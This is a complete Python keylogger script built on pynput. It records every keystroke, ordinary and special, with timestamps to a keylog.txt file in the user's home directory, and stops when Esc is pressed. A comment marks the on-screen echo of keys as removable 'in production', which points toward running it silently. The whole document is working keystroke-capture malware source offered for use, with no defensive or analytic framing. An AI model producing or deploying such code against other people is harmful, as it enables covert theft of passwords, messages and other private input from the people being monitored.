from pynput import keyboard
import logging
import os

# Configure logging to store keystrokes in a file
LOG_DIR = os.path.expanduser("~")  # Save log file in the user's home directory
LOG_FILE = os.path.join(LOG_DIR, "keylog.txt")
logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format="%(asctime)s: %(message)s")

class Keylogger:
    def __init__(self):
        self.current_keys = []

    def on_press(self, key):
        try:
            # Handle alphanumeric keys
            logging.info(f"Key pressed: {key.char}")
            self.current_keys.append(key.char)
        except AttributeError:
            # Handle special keys
            logging.info(f"Special key pressed: {key}")
            self.current_keys.append(f"[{key}]")

        # Optional: Print the key (can be removed in production)
        print(f"Key pressed: {key}")

    def on_release(self, key):
        if key == keyboard.Key.esc:
            # Stop listener on 'Esc' key
            print("Stopping keylogger...")
            return False

    def start(self):
        # Listen for keyboard events
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

# Run keylogger
if __name__ == "__main__":
    print("Starting keylogger (Press 'Esc' to stop)...")
    keylogger = Keylogger()
    keylogger.start()
